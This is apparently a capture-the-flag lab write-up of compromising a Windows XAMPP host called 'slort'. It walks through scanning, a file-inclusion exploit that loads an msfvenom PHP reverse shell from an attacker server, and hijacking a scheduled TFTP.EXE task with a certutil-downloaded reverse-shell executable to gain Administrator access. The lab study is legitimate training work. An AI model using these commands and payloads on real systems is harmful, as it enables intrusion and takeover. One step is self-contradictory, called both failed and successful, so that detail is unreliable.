# NMAP

The command executes a comprehensive Nmap scan against the target host 192.168.151.53 with root privileges. It performs version detection and default script scanning on all TCP ports, ignoring host discovery, and includes OS fingerprinting. The scan is filtered to report only open ports.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.151.53   --open 
```

The Nmap scan results indicate a Windows host running multiple services. Key findings include an FTP server with version information, SMB shares accessible via ports 139 and 445, and an MySQL database server. Two Apache HTTP web servers are present on ports 4443 and 8080, both hosting a default XAMPP dashboard page, with one potentially acting as an open proxy. Several high-port MSRPC endpoints and additional unknown services on ports 5040 and 7680 were also discovered.

```bash
1/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.151.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.151.53:8080/dashboard/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC


```

The directory brute-force scan against the web server on port 4443 identified several accessible paths. The primary discovery is the default XAMPP dashboard at the `/dashboard` directory. The `/site` and `/img` directories are also enumerable. Multiple access denials were observed for common administrative paths and reserved Windows device names, indicating potential security filters. The `/examples` directory returned a service unavailable status.

```bash
gobuster dir -u  http://192.168.151.53:4443   -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.151.53:4443
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 1046]
/.htaccess            (Status: 403) [Size: 1046]
/.htpasswd            (Status: 403) [Size: 1046]
/aux                  (Status: 403) [Size: 1046]
/cgi-bin/             (Status: 403) [Size: 1060]
/com1                 (Status: 403) [Size: 1046]
/com3                 (Status: 403) [Size: 1046]
/com2                 (Status: 403) [Size: 1046]
/con                  (Status: 403) [Size: 1046]
/dashboard            (Status: 301) [Size: 351] [--> http://192.168.151.53:4443/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 345] [--> http://192.168.151.53:4443/img/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.151.53:4443/dashboard/]
/licenses             (Status: 403) [Size: 1205]
/lpt1                 (Status: 403) [Size: 1046]
/lpt2                 (Status: 403) [Size: 1046]
/nul                  (Status: 403) [Size: 1046]
/phpmyadmin           (Status: 403) [Size: 1205]
/prn                  (Status: 403) [Size: 1046]
/examples             (Status: 503) [Size: 1060]
/server-info          (Status: 403) [Size: 1205]
/server-status        (Status: 403) [Size: 1205]
/site                 (Status: 301) [Size: 346] [--> http://192.168.151.53:4443/site/]
/webalizer            (Status: 403) [Size: 1046]
Progress: 4614 / 4615 (99.98%)


```

Analysis of the file "slort.png" reveals its actual content is a PHP error message, not image data. The error indicates the server attempted to include a file named "random" using the `include()` function on line 4 of `C:\xampp\htdocs\site\index.php`. This demonstrates a Local File Inclusion vulnerability where user-controlled input is passed unsanitized to the `include` function.

![[Pasted image 20251225032922.png]]

The command generates a PHP reverse shell payload using msfvenom. The payload is configured to connect back to the attacker's machine at IP address 192.168.45.193 on port 21. The output is saved in raw format to a file named phpreverseshell.php, creating a 2990-byte malicious script for remote code execution.

```bash
msfvenom -p php/reverse_php LHOST=192.168.45.193 LPORT=21 -f raw > phpreverseshell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2990 bytes
```

The command starts a simple HTTP server on port 80 using Python 3. This server is used to host files, such as the previously generated PHP reverse shell payload, for download by the target machine during exploitation.

```bash
python3 -m http.server 80
```

The command exploits the identified Local File Inclusion vulnerability by making an HTTP request to the target's `index.php` script. It passes a malicious URL parameter (`page`) pointing to the attacker-hosted PHP reverse shell file. This triggers the inclusion and execution of the remote PHP code, resulting in a reverse shell connection from the target to the attacker's system.

```bash
curl http://192.168.151.53:8080/site/index.php?page=http://192.168.45.193/phpreverseshell.php
```

A reverse shell connection was successfully established from the target host. The shell is running in the context of the user "rupert" within the "slort" domain. The current directory is "C:\Backup", which contains a scheduled task configuration. The "info.txt" file indicates a recurring task executes "TFTP.EXE" every five minutes to fetch "backup.txt" from the IP address 192.168.234.57. This presents an opportunity for privilege escalation by hijacking the TFTP file transfer.

```bash
rlwrap -cAr nc -lnvp 21  
listening on [any] 21 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.151.53] 52200
whoami
slort\rupert

Directory of C:\Backup

07/20/2020  06:08 AM    <DIR>          .
07/20/2020  06:08 AM    <DIR>          ..
06/12/2020  06:45 AM            11,304 backup.txt
06/12/2020  06:45 AM                73 info.txt
06/23/2020  06:49 PM            73,802 TFTP.EXE
               3 File(s)         85,179 bytes
               2 Dir(s)  28,575,907,840 bytes free
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
                                  
```

The msfvenom command failed due to an invalid LHOST option. This prevented the generation of a Windows reverse shell executable payload. The intended action was to create a malicious TFTP.EXE file to replace the legitimate one, leveraging the scheduled task for privilege escalation. The operation was  successful.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.193 LPORT=1338 -f exe > TFTP.EXE 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
                                                
```

The established reverse shell was used to capture the local proof file "local.txt" with the hash ec4003677bbda1f60c4f312b596a8f29. The operator then navigated to the "C:\Backup" directory and renamed the legitimate "TFTP.EXE" to "TFTP.old". Finally, the Windows certutil utility was employed to download a malicious "TFTP.EXE" replacement from the attacker's web server at 192.168.45.193. This positions the malicious payload for execution by the scheduled task.

```bash
rlwrap -cAr nc -lnvp 21                                                                  
listening on [any] 21 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.151.53] 52552

type local.txt
ec4003677bbda1f60c4f312b596a8f29
cd Backup
move TFTP.EXE TFTP.old

certutil.exe -f -urlcache -split http://192.168.45.193/TFTP.EXE
```

A second reverse shell connection was received on the specified listener, port 1338. The shell operates with Administrator privileges, as confirmed by the successful access to and reading of the "proof.txt" file located on the Administrator's desktop. The contents of the proof file are the hash 4213e0bea11aa861d9888baaa87dc02d, demonstrating a successful privilege escalation and full system compromise.

```bash
rlwrap -cAr nc -lnvp 1338
listening on [any] 1338

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
4213e0bea11aa861d9888baaa87dc02d



```